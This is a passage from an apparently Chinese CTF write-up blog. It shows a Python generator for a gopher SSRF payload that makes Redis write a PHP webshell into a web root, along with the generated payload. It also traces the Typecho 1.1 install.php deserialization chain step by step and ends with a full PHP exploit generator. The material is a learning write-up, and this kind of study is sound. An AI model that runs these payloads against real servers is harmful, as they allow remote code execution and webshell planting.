+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.207.21.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p>生成payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://173.207.21.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>
+
+<p>这里是换了台机子，所以ip变了，ip四个位置还是11，端口也没变。下面把payload打过去，注意这里一定要把payload放到这个框里面提交，用hackbar打不过去。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526172852.png"></p>
+<p>然后再访问shell.php，得到flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526173053.png"></p>
+<p>ssrf+gopher这个东西要放到日后的深入学习目标中了。</p>
+<h2 id="EzTypecho"><a href="#EzTypecho" class="headerlink" title="EzTypecho"></a>EzTypecho</h2><p>看题目知道是Typecho，和php相关。题目直接给了源代码，体量对我来说很大，不知从何搞起。看wp说Typecho的漏洞基本出在install.php，而且这题基本就是考typcheo1.1的反序列化链。</p>
+<p>先进install.php找到反序列化点。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526192543.png"></p>
+<p>看到还设置了检测，看是否有$_SESSION，但是题目没有使用session_start()。要想反序列化就得先绕过这个检测，根据PHP文档有：</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526192655.png"></p>
+<p>那么在文件上传时，POST一个与PHP_SESSION_UPLOAD_PROGRESS同名变量时会在 session中添加数据，从而绕过session检测。</p>
+<p>下面就是整个反序列化链的构造了，一般从反序列化点倒着推，去找有哪些可控点，是比较顺的。typecho1.1反序列化链参考自该<a target="_blank" rel="noopener" href="http://www.tomyxy.com/index.php/archives/3.html">博客</a>。</p>
+<p>从install.php开始，231行看到unserialize函数，为反序列化点。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?php</span><br><span class="line">    <span class="variable">$config</span> = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">    Typecho_Cookie::delete(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> Typecho_Db(<span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line">    <span class="variable">$db</span>-&gt;addServer(<span class="variable">$config</span>, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">    Typecho_Db::set(<span class="variable">$db</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>跟进Typecho_Cookie::get()（在cookie.php中），看到从cookie中获取，变量可控。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="variable">$_prefix</span> . <span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$value</span> = <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$key</span>]) ? <span class="variable">$_COOKIE</span>[<span class="variable">$key</span>] : (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) ? <span class="variable">$_POST</span>[<span class="variable">$key</span>] : <span class="variable">$default</span>);</span><br><span class="line">    <span class="keyword">return</span> is_array(<span class="variable">$value</span>) ? <span class="variable">$default</span> : <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再看install.php前面一部分的代码，看能否通过验证执行到反序列化这个位置。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">&#x27;/config.inc.php&#x27;</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;typecho&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 挡掉可能的跨站请求</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>) || !<span class="keyword">empty</span>(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>] = <span class="string">&quot;<span class="subst">&#123;$parts[&#x27;host&#x27;]&#125;</span>:<span class="subst">&#123;$parts[&#x27;port&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] != <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到要想执行到下面的命令，需要两个条件，一是通过get方式提交有finish参数，这部分返回0，后面就不用管了，二是HTTP_REFERER非空且为自己的host，很容易实现。这样就可以开始思考如何利用这个反序列化漏洞。</p>
+<p>反序列化漏洞需要魔术方法，常见几种如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//使用unserialize时触发</span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>
+
+<p>再放一个详细介绍反序列化方法的<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000007250604">链接</a>。</p>
+<p>跟进Typecho_Db()（在Db.php中）。这里跟进，是因为Typecho_Db()这个函数在接下来要处理我们可控的反序列化数据，要看看Typecho_Db()对数据做了什么操作。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapterName</span>, <span class="variable">$prefix</span> = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">    <span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>(<span class="variable">$adapterName</span>, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_prefix = <span class="variable">$prefix</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化适配器对象</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> <span class="variable">$adapterName</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>$adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;</code>将变量与字符串连接，如果我们这个变量是对象，那便会调用魔术方法__toString()。经过搜索整个代码发现，__toString()有三处，在feed.php的__toString()方法（在Typecho_Feed类中）中，有这么一串代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;item&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;title&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$item</span>[<span class="string">&#x27;title&#x27;</span>]) . <span class="string">&#x27;&lt;/title&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;link&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/link&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;guid&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/guid&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;pubDate&gt;&#x27;</span> . <span class="keyword">$this</span>-&gt;dateFormat(<span class="variable">$item</span>[<span class="string">&#x27;date&#x27;</span>]) . <span class="string">&#x27;&lt;/pubDate&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>]) &amp;&amp; is_array(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>] <span class="keyword">as</span> <span class="variable">$category</span>) &#123;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;category&gt;&lt;![CDATA[&#x27;</span> . <span class="variable">$category</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;]]&gt;&lt;/category&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读到<code>$content .= &#39;&lt;dc:creator&gt;&#39; . htmlspecialchars($item[&#39;author&#39;]-&gt;screenName) . &#39;&lt;/dc:creator&gt;&#39; . self::EOL;</code>发现问题，前面提到__get()用于从不可访问的属性读取数据，foreach遍历时当screenName属性不存在的时候会调用__get()。这就全局搜索有__get()方法的类（在Typecho_Request类中），在Request.php有代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)//$<span class="title">key</span>为不能访问的属性，<span class="title">prvite</span>在其他类不能被访问，所以下文<span class="title">exp</span>设为<span class="title">private</span>属性</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进get()，仍在Request.php中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;_params[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>]):</span><br><span class="line">        	<span class="variable">$value</span> = <span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>];</span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        	<span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = !is_array(<span class="variable">$value</span>) &amp;&amp; strlen(<span class="variable">$value</span>) &gt; <span class="number">0</span> ? <span class="variable">$value</span> : <span class="variable">$default</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进_applyFilter()，仍在Request.php。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = is_array(<span class="variable">$value</span>) ? array_map(<span class="variable">$filter</span>, <span class="variable">$value</span>) :</span><br><span class="line">            call_user_func(<span class="variable">$filter</span>, <span class="variable">$value</span>);<span class="comment">//把第一个参数作为回调函数调用</span></span><br><span class="line">            		<span class="comment">//所以下面exp中$filter=assert，用来执行命令；$value为我们想要的命令</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到了call_user_func($filter, $value)，这个函数的作用是把第一个参数作为回调函数调用，比如这个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?php</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">barber</span>(<span class="params"><span class="variable">$type</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You wanted a <span class="subst">$type</span> haircut, no problem\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    call_user_func(<span class="string">&#x27;barber&#x27;</span>, <span class="string">&quot;mushroom&quot;</span>);  <span class="comment">//输出You wanted a mushroom haircut, no problem</span></span><br><span class="line">    call_user_func(<span class="string">&#x27;barber&#x27;</span>, <span class="string">&quot;shave&quot;</span>);  <span class="comment">//输出You wanted a shave haircut, no problem</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>到此为止构造出POP链：</p>
+<p>install.php中unserialize()内容可控==&gt;install.php实例化了一个Typecho_Db，Typecho_Db对象在获取适配器名称$adapterName时调用了魔术方法__toString()==&gt;Feed.php执行__toString()的时候在获取screenName的时候调用了__get()方法==&gt;Request.php中__get()中调用get()，其中执行了_applyFilte()==&gt; Request.php中的_applyFilter()中使用了call_user_func()，该回调函数导致漏洞触发。</p>
+<p>构造的exp如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?php		<span class="comment">//添加的反斜杠为代码渲染问题，前后代码都是如此</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> RSS1 = <span class="string">&#x27;RSS 1.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> ATOM1 = <span class="string">&#x27;ATOM 1.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> DATE_RFC822 = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> DATE_W3CDTF = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> EOL = <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_items</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::RSS2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;link&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;date&#x27;</span> =&gt; <span class="number">1540996608</span>,</span><br><span class="line">            <span class="string">&#x27;category&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="string">&#x27;author&#x27;</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;adapter&#x27;</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho_&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$payload</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
